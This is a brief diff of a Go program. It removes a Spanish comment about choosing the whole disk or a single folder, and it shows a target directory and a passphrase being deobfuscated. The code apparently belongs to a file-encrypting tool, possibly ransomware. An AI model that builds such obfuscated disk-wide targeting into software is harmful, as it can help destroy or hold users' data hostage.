@@ -285,7 +285,6 @@ func main() {
 		}
 	}
 
-	//cambiar valor para que sea disco entero o a partir de una carpeta
 	Dir := "R{pwWYOmdoNwenKwfIW{[YJ>"
 	Dir = desofuscarTexto(Dir)
 	passphrase = desofuscarTexto(passphrase)
